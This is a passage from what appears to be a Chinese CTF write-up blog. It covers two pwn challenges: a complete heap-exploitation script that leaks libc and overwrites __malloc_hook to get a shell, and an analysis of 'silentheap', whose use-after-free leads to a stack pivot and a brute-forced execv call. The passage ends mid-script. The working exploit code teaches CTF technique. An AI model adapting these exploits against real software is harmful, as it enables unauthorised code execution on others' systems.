process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'49.232.101.194'</span>,<span class="number">54337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,index,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">1</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">    Show(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' : aaaaaaaa'</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">6</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x00007fa9b0771c78</span><span class="number">-0x7fa9b03ad000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#3 &amp; 4 &amp; 5</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x18</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5 border</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x20</span>))<span class="comment">#3</span></span><br><span class="line">    <span class="comment">#chunk shrink</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)<span class="comment">#1 &amp; 2 &amp; 3 &amp; 4</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">1</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">3</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#Delete(3)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)<span class="comment">#1 &amp; 2 &amp; 3 &amp; 4</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)<span class="comment">#1 &amp; 2 &amp; 3 &amp; 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#overlap chunk3</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">1</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0 == 3</span></span><br><span class="line">    <span class="comment">#double free</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    main_arena = libc_base + (<span class="number">0x7fa9b0771b20</span><span class="number">-0x7fa9b03ad000</span>)</span><br><span class="line">    fake_chunk = main_arena+<span class="number">0xd</span></span><br><span class="line">    fake_top = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x25</span></span><br><span class="line">    <span class="comment">#fake_top = libc_base + libc.symbols['__free_hook']-0x17</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]<span class="comment">#0 2 tried</span></span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">0</span>,p64(fake_chunk))<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">0x3b</span>+p64(fake_top))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">'\x00'</span>*(<span class="number">5</span>+<span class="number">0x8</span>)+p64(shell_addr)+p64(realloc_addr+<span class="number">0xe</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#Add(0x58,0,'\x00'*7+p64(system_addr))#0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#Add(0x38,0,'\x00'*7+p64(system_addr))#0</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size : "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">17</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Add(0x10,1,'/bin/sh\x00')</span></span><br><span class="line">    <span class="comment">#Delete(1)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="silentheap"><a href="#silentheap" class="headerlink" title="silentheap"></a>silentheap</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这题花的时间最久，最后也不算完全搞好，看了长亭的Exp和另一个大佬的思路，留在这里记录一下。</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序有几个功能，Malloc1分配一个0x158的块，在0x154偏移处放了magic1函数地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk_addr; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_addr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x158</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(chunk_addr + <span class="number">4</span>, src);</span><br><span class="line">    *((_DWORD *)chunk_addr + <span class="number">0x55</span>) = magic1;    <span class="comment">// offset:0x154</span></span><br><span class="line">    ptr[i] = chunk_addr;</span><br><span class="line">    dword_804AA60[i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Malloc2分配一个0x358的堆块，0x354处放magic2函数地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x358</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(v0 + <span class="number">4</span>, aThouWhoArtDark);</span><br><span class="line">    *((_DWORD *)v0 + <span class="number">0xD5</span>) = magic2;</span><br><span class="line">    ptr[i] = v0;</span><br><span class="line">    dword_804AA60[i] = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">magic1</span><span class="params">(<span class="keyword">int</span> chunk_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+0h] [ebp-158h]</span></span><br><span class="line"></span><br><span class="line">  get_input((<span class="keyword">int</span>)&amp;s1, <span class="number">0x150</span>);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(chunk_addr + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = get_input(chunk_addr + <span class="number">4</span>, <span class="number">0x150</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">magic2</span><span class="params">(<span class="keyword">int</span> chunk_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+0h] [ebp-358h]</span></span><br><span class="line"></span><br><span class="line">  get_input((<span class="keyword">int</span>)&amp;s1, <span class="number">0x350</span>);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(chunk_addr + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = get_input(chunk_addr + <span class="number">4</span>, <span class="number">0x350</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Free函数从后往前覆盖，不会清空chunk_addr[idx]，但是会把chunk_size[idx]清零。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = read_int();</span><br><span class="line">  idx = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">int</span>)ptr[result];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = dword_804AA60[idx];</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">        <span class="keyword">for</span> ( i = idx; i &lt;= <span class="number">8</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          ptr[i] = ptr[i + <span class="number">1</span>];</span><br><span class="line">          dword_804AA60[i] = dword_804AA60[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        result = i;</span><br><span class="line">        dword_804AA60[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CallFunc可以去调用堆里的magic函数，这里有UAF，UAF一个0x358的块，提前在里面构造好magic2的函数地址，之后可以任意地址执行。长亭的wp是ret到了0x08048690，调试之后发现ret过去相当于getinput栈地址，size为0x08..的一个极大数，这就造成了栈溢出，因为这里没有puts函数，栈迁移之后构造ret2_dl_runtime_resolve应该就可以了，但是调试发现不太行，这块有点迷，也懒得编译32位libc去看源码了，再看另一个师傅1mpossible的wp发现可以爆破，bss里放个binsh，之后爆破execv的地址，大概中间三字节是0xdxx或者0xexx，因此复杂度应该是256*2，本地跑了三分钟出的，个人感觉远程应该要10分钟以上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&quot;DEBUG&quot;</span><br><span class="line">#s = remote(&apos;152.136.21.148&apos;,12047)</span><br><span class="line">context.terminal = [&apos;tmux&apos;,&apos;split&apos;,&apos;-h&apos;]</span><br><span class="line">elf = ELF(&apos;./silentheap&apos;)</span><br><span class="line">gadgets = [0x3d0d3,0x3d0d5,0x3d0d9,0x3d0e0,0x67a7f,0x67a80,0x137e5e,0x137e5f]</span><br><span class="line">def malloc_0(s):</span><br><span class="line">    s.sendline(&apos;1&apos;)</span><br><span class="line">def malloc_1(s):</span><br><span class="line">    s.sendline(&apos;2&apos;)</span><br><span class="line">def run(s,idx):</span><br><span class="line">    s.sendline(&apos;3&apos;)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line">def free(s,idx):</span><br><span class="line">    s.sendline(&apos;4&apos;)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line">def write_(s,idx):</span><br><span class="line">    s.sendline(&apos;5&apos;)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line">def pwn(s):</span><br><span class="line">    p_ret = 0x0804841d</span><br><span class="line">    p2_ret = 0x08048aca</span><br><span class="line">    p3_ret = 0x08048ac9</span><br><span class="line">    p4_ret = 0x08048ac8</span><br><span class="line">    a1 = &quot;Darkness beyond twilight Crimson beyond blood that flows Buried in the stream of time is where your power grows I pledge myself to conquer all the foes who stand before the mighty gift bestowed in my unworthy hand Let the fools who stand before me be destroyed by the power you and I possess...&quot;</span><br><span class="line">    a2 = &quot;Thou who art darker than even darkness, Thou who art deeper than even the night! Thou, the Sea of Chaos, who drifts upon it, Golden Lord of Darkness! Hereby I call to thee, Hereby I swear before thee! Those who would stand against us, All those who are fools, By the power you and I possess, Grant destruction equally upon them all!&quot;</span><br><span class="line"></span><br><span class="line">    dynamic= 0x08049f14</span><br><span class="line">    strtab = 0x080482cc</span><br><span class="line">    symtab = 0x080481dc</span><br><span class="line">    rel_plt = 0x080483b4</span><br><span class="line">    write_(s,1)</span><br><span class="line">    #s.sendline(a1)</span><br><span class="line">    s.sendline(&apos;A&apos;*0x148)</span><br><span class="line">    write_(s,2)</span><br><span class="line">    #s.sendline(a2)</span><br><span class="line">    s.sendline(p32(0x08048690)*(0x348/4))</span><br><span class="line">    for i in range(10):</span><br><span class="line">        malloc_1(s)</span><br><span class="line">    free(s,9)</span><br><span class="line">    #gdb.attach(s,&apos;b* 0x080489ba&apos;)</span><br><span class="line"></span><br><span class="line">    #gdb.attach(s,&apos;b* 0x080489ba&apos;)</span><br><span class="line"></span><br><span class="line">    #gdb.attach(s,&apos;b* 0x08048694&apos;)</span><br><span class="line">    #gdb.attach(s,&apos;b* 0x80486ac&apos;)</span><br><span class="line">    run(s,9)</span><br><span class="line">    bss_1 = elf.bss()+0x100</span><br><span class="line">    log.success(&apos;bss1 addr =&gt; &apos; + hex(bss_1))</span><br><span class="line">    bss_2 = elf.bss()+0x200</span><br><span class="line">    read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">    resolve_plt = 0x08048420</span><br><span class="line">    leave_ret = 0x08048538</span><br><span class="line">    pay = &apos;A&apos;*0x12</span><br><span class="line">    pay += p32(bss_1)</span><br><span class="line">    pay += p32(read_plt) + p32(0x08048ac8) + p32(0) + p32(bss_1) + p32(0x100) + p32(bss_1) + p32(leave_ret)</span><br><span class="line">    s.sendline(pay)</span><br><span class="line">    #calc</span><br><span class="line">    free_got = elf.got[&apos;free&apos;]</span><br><span class="line">    fake_data_addr = bss_1 + 0x40</span><br><span class="line">    fake_rel_off = fake_data_addr - rel_plt</span><br><span class="line">    fake_sym_off = (fake_data_addr + 0x10 - symtab) / 0x10</span><br><span class="line">    log.info(&apos;fake sym off =&gt; &apos; + hex(fake_sym_off))</span><br><span class="line">    fake_str_off = (fake_data_addr+0xc+0x10-strtab)</span><br><span class="line">    binsh_addr = (fake_data_addr+0xc+0x10+0x7)</span><br><span class="line">    #set structs</span><br><span class="line">    fake_rel = p32(free_got) + p32((fake_sym_off&lt;&lt;8)+7)</span><br><span class="line">    fake_sym = p32(fake_str_off)+p32(0)*2+chr(0x12)+chr(0)+p16(0)</span><br><span class="line">    strings = &quot;system\x00/bin/sh\x00\x00&quot;</span><br><span class="line">    #</span><br><span class="line">    payload = p32(0) + p32(resolve_plt) + p32(fake_rel_off)+&quot;a&quot;*4+p32(binsh_addr)</span><br><span class="line">    payload = payload.ljust(0x3c,&apos;a&apos;)</span><br><span class="line">    payload += p32(binsh_addr)</span><br><span class="line">    payload += fake_rel + &apos;a&apos;*4 + fake_sym + strings</span><br><span class="line">    binsh_addr = 0x0804ab20+0x8</span><br><span class="line">    buf = p32(bss_1)+p32(p3_ret)+&quot;/bin/sh\x00&quot;+p32(bss_1)+p32(0xf7dea000+0xbf740)+p32(0x08048406)+p32(binsh_addr)+p32(0)*2</span><br><span class="line">    s.send(buf)</span><br><span class="line">    s.sendline(&quot;ls&quot;)</span><br><span class="line">    data = s.recv()</span><br><span class="line">    if data and &quot;smashing&quot; not in data:</span><br><span class="line">        s.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    while True:</span><br><span class="line">        s = process(&apos;./silentheap&apos;)</span><br><span class="line">        try:</span><br><span class="line">            pwn(s)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            s.close()</span><br><span class="line">        finally:</span><br><span class="line">            s.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CallFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = read_int();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">int</span>)ptr[result];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( dword_804AA60[v1] == <span class="number">2</span> )</span><br><span class="line">        result = (*((<span class="keyword">int</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1] + <span class="number">0xD5</span>))(ptr[v1]);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result = (*((<span class="keyword">int</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1] + <span class="number">0x55</span>))(ptr[v1]);<span class="comment">// else 包含0的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048690                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:08048693                 push    eax</span><br><span class="line">.text:08048694                 call    get_input</span><br><span class="line">.text:08048699                 add     esp, 10h</span><br><span class="line">.text:0804869C                 sub     esp, 0Ch</span><br><span class="line">.text:0804869F                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:080486A2                 push    eax             ; nptr</span><br><span class="line">.text:080486A3                 call    _atoi</span><br><span class="line">.text:080486A8                 add     esp, 10h</span><br><span class="line">.text:080486AB                 leave</span><br><span class="line">.text:080486AC                 retn</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"DEBUG"</span></span><br><span class="line"><span class="comment">#s = remote('152.136.21.148',12047)</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./silentheap'</span>)</span><br><span class="line">gadgets = [<span class="number">0x3d0d3</span>,<span class="number">0x3d0d5</span>,<span class="number">0x3d0d9</span>,<span class="number">0x3d0e0</span>,<span class="number">0x67a7f</span>,<span class="number">0x67a80</span>,<span class="number">0x137e5e</span>,<span class="number">0x137e5f</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_0</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_1</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(s,idx)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'3'</span>)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(s,idx)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'4'</span>)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(s,idx)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'5'</span>)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(s)</span>:</span></span><br><span class="line">    p_ret = <span class="number">0x0804841d</span></span><br><span class="line">    p2_ret = <span class="number">0x08048aca</span></span><br><span class="line">    p3_ret = <span class="number">0x08048ac9</span></span><br><span class="line">    p4_ret = <span class="number">0x08048ac8</span></span><br><span class="line">    a1 = <span class="string">"Darkness beyond twilight Crimson beyond blood that flows Buried in the stream of time is where your power grows I pledge myself to conquer all the foes who stand before the mighty gift bestowed in my unworthy hand Let the fools who stand before me be destroyed by the power you and I possess..."</span></span><br><span class="line">    a2 = <span class="string">"Thou who art darker than even darkness, Thou who art deeper than even the night! Thou, the Sea of Chaos, who drifts upon it, Golden Lord of Darkness! Hereby I call to thee, Hereby I swear before thee! Those who would stand against us, All those who are fools, By the power you and I possess, Grant destruction equally upon them all!"</span></span><br><span class="line"></span><br><span class="line">    dynamic= <span class="number">0x08049f14</span></span><br><span class="line">    strtab = <span class="number">0x080482cc</span></span><br><span class="line">    symtab = <span class="number">0x080481dc</span></span><br><span class="line">    rel_plt = <span class="number">0x080483b4</span></span><br><span class="line">    write_(s,<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#s.sendline(a1)</span></span><br><span class="line">    s.sendline(<span class="string">'A'</span>*<span class="number">0x148</span>)</span><br><span class="line">    write_(s,<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#s.sendline(a2)</span></span><br><span class="line">    s.sendline(p32(<span class="number">0x08048690</span>)*(<span class="number">0x348</span>/<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        malloc_1(s)</span><br><span class="line">    free(s,<span class="number">9</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x080489ba')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x080489ba')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x08048694')</span></span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x80486ac')</span></span><br><span class="line">    run(s,<span class="number">9</span>)</span><br><span class="line">    bss_1 = elf.bss()+<span class="number">0x100</span></span><br><span class="line">    log.success(<span class="string">'bss1 addr =&gt; '</span> + hex(bss_1))</span><br><span class="line">    bss_2 = elf.bss()+<span class="number">0x200</span></span><br><span class="line">    read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">    resolve_plt = <span class="number">0x08048420</span></span><br><span class="line">    leave_ret = <span class="number">0x08048538</span></span><br><span class="line">    pay = <span class="string">'A'</span>*<span class="number">0x12</span></span><br><span class="line">    pay += p32(bss_1)</span><br><span class="line">    pay += p32(read_plt) + p32(<span class="number">0x08048ac8</span>) + p32(<span class="number">0</span>) + p32(bss_1) + p32(<span class="number">0x100</span>) + p32(bss_1) + p32(leave_ret)</span><br><span class="line">    s.sendline(pay)</span><br><span class="line">    <span class="comment">#calc</span></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    fake_data_addr = bss_1 + <span 